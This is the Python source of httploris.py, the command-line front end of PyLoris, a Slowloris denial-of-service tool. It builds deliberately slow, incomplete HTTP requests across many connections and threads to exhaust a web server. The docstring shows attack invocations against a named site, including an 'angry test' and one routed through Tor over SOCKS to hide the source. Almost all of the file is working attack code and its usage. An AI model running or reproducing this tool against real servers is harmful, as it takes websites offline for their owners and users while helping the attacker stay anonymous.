#! /usr/bin/env python

"""
httploris.py
This is the current version of the original functionality of pyloris. This script
is invoked quite similarly to the original pyloris.py; however, some of the arguemnts
have changed. Use httploris.py --help to see the current features supported.

[EXAMPLE] A basic test:
httploris.py motomastyle.com

[EXAMPLE] A basic test over HTTPS
httploris.py motomastyle.com --ssl -p 443

[EXAMPLE] A continuous test:
httploris.py motomastyle.com -c 0

[EXAMPLE] An angry test:
httploris.py motomastyle.com -c 0 -k -P "/index.html" -s 500000 -w 0.5 -b 0.5 -r POST -u "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.33 Safari/530.5"

[EXAMPLE] A test through SOCKS5 (i.e. Vidalia):
httploris.py motomastyle.com --socksversion 5 --sockshost 127.0.0.1 --socksport 9050

CONTRIBUTORS
Version 1.02 Vlad
Class ScriptLoris() implemented. Minor changes and Bug fixes.
Version 1.03 ----
-------
"""

import optparse
import sys

from libloris import *

def parse_options():
    parser = optparse.OptionParser(usage = "%prog [options] www.host.com")
    parser.add_option("-a", "--attacklimit", action = "store", type = "int", dest = "attacklimit", default = 500, help = "Total number of connections to make (0 = unlimited, default = 500)")
    parser.add_option("-c", "--connectionlimit", action = "store", type = "int", dest = "connectionlimit", default = 500, help = "Total number of concurrent connections to allow (0 = unlimited, default = 500)")
    parser.add_option("-t", "--threadlimit", action = "store", type = "int", dest = "threadlimit", default = 50, help = "Total number of concurrent threads (0 = unlimited, default = 50)")
    parser.add_option("-b", "--connectionspeed", action = "store", type = "float", dest = "connectionspeed", default = 1, help = "Individual connection bandwidth in bytes per second (default = 1)")

    parser.add_option("-f", "--finish", action = "store_true", dest = "finish", default = False, help = "Complete each session rather than leave them unfinished (lessens the effectiveness, increases bandwidth usage)")
    parser.add_option("-k", "--keepalive", action = "store_true", dest = "keepalive", default = False, help = "Turn Keep-Alive on")

    parser.add_option("-p", "--port", action = "store", type = "int", dest = "port", default = 80, help = "Port to initiate attack on (default = 80)")
    parser.add_option("-P", "--page", action = "store", type = "string", dest="page", default = '/', help = "Page to request from the server (default = /)")
    parser.add_option("-q", "--quit", action = "store_true", dest = "quit", default = False, help = "Quit without receiving data from the server (can shorten the duration of the attack)")
    parser.add_option("-r", "--requesttype", action = "store", type = "string", dest = "requesttype", default = 'GET', help = "Request type, GET, HEAD, POST, PUT, DELETE, OPTIONS, or TRACE (default = GET)")
    parser.add_option("-R", "--referer", action = "store", type = "string", dest = "referer", default = '', help = "Set the Referer HTTP header.")
    parser.add_option("-s", "--size", action = "store", type = "int", dest = "size", default = 1, help = "Size of data segment to attach in cookie (default = 0)")
    parser.add_option("-S", "--ssl", action = "store_true", dest = "ssl", default = False, help = "Use SSL/TLS connection (for HTTPS testing)")
    parser.add_option("-u", "--useragent", action = "store", type = "string", dest = "useragent", default = '', help = "The User-Agent string for connections (defaut = pyloris.sf.net)")
    parser.add_option("-z", "--gzip", action = "store_true", dest = "gzip", default = False, help = "Request compressed data stream")

    parser.add_option("-w", "--timebetweenthreads", action = "store", type = "float", dest = "timebetweenthreads", default = 0, help = "Time to wait between spawning threads in seconds (default = 0)")
    parser.add_option("-W", "--timebetweenconnections", action = "store", type = "float", dest = "timebetweenconnections", default = 1, help = "Time to wait in between starting connections (default = 1)")

    parser.add_option("", "--socksversion", action = "store", type = "string", dest = "socksversion", default = '', help = "SOCKS version, SOCKS4, SOCKS5, or HTTP. Reqires --sockshost and --socksport")
    parser.add_option("", "--sockshost", action = "store", type = "string", dest = "sockshost", default = '127.0.0.1', help = "SOCKS host address (default = 127.0.0.1)")
    parser.add_option("", "--socksport", action = "store", type = "int", dest = "socksport", default = 0, help = "SOCKS port number")
    parser.add_option("", "--socksuser", action = "store", type = "string", dest = "socksuser", default = '', help = "SOCKS username")
    parser.add_option("", "--sockspass", action = "store", type = "string", dest = "sockspass", default = '', help = "SOCKS password")

    parser.add_option("-v", "--verbosity", action = "store", type = "int", dest = "verbosity", default = 1, help = "Verbosity level")
    parser.add_option("", "--post", action = "store", type = "string", dest = "post", default = '', help = "Post data to send")
    parser.add_option("", "--contenttype", action = "store", type = "string", dest = "contenttype", default = 'text/html', help = "Post data type")
    parser.add_option("", "--cookie", action = "store", type = "string", dest = "cookie", default = '', help = "Cookie data")
    parser.add_option("", "--trylimit", action = "store", type = "int", dest = "trylimit", default = 10, help = "Number of tries to connect")

    (options, args) = parser.parse_args()

    sys.stdout.write("PyLoris, a Python implementation of the Slowloris attack (http://ha.ckers.org/slowloris).\r\n")

    if len(args) != 1:
        sys.stderr.write("No host supplied or incorrect number of arguments used.\nUse -h or --help for more information\n")
        print args
        sys.exit(1)
    
    OptionSet = DefaultOptions()

    OptionSet['host'] = args[0]
    OptionSet['port'] = options.port
    OptionSet['ssl'] = options.ssl
    OptionSet['attacklimit'] = options.attacklimit
    OptionSet['connectionlimit'] = options.connectionlimit
    OptionSet['threadlimit'] = options.threadlimit
    OptionSet['trylimit'] = options.trylimit
    OptionSet['timebetweenthreads'] = options.timebetweenthreads
    OptionSet['timebetweenconnections'] = options.timebetweenconnections
    OptionSet['connectionspeed'] = options.connectionspeed
    OptionSet['socksversion'] = options.socksversion
    OptionSet['sockshost'] = options.sockshost
    OptionSet['socksport'] = options.socksport
    OptionSet['socksuser'] = options.socksuser
    OptionSet['sockspass'] = options.sockspass
    OptionSet['quitimmediately'] = options.quit

    requesttype = options.requesttype.upper()
    if requesttype not in ('GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE'):
        sys.stderr.write('Invalid request type.\nUse -h or --help for more information')
        sys.exit(3)

    request = '%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s' % (requesttype, options.page, args[0], options.useragent)
    if options.size > 100:
        count = options.size / 100
        for i in range(int(count)):
            request += ('data%i=%s&' % (i, options.useragent * 100))
        request += 'data=' + (options.useragent * 100)
    else:
        request += 'data=' + (options.useragent * options.size)

    if options.keepalive == True:
        request += '\r\nKeep-Alive: 300\r\nConnection: Keep-Alive'

    if options.gzip == True:
        request += '\r\nAccept-Encoding: gzip, deflate'

    if options.referer != '':
        request += '\r\nReferer: %s' % (options.referer)

    if options.cookie != '':
        request += '\r\nCookie: '
        if options.size > 100:
            count = options.size / 100
            for i in range(int(count)):
                request += ('data%i=%s&' % (i, options.cookie * 100))
            request += 'data=' + (options.cookie * 100)
        else:
            request += 'data=' + (options.cookie * options.size)

    if requesttype == 'POST':
        print 'POST method'
        request += '\r\nContent-Type: %s' % (options.contenttype)
        request += '\r\nContent-Length: %i' % (len(options.post) * options.size)

    request += '\r\n'

    if options.finish == True:
        print 'Specifying the -f or --finish flags can reduce the effectiveness of the test and increase bandwidth usage.'
        request += '\r\n'

    if requesttype == 'POST':
        request += options.post * options.size
        
    OptionSet['request'] = request

    return OptionSet

if __name__ == "__main__":
    loris=ScriptLoris()
    loris.options = parse_options()
    loris.mainloop()
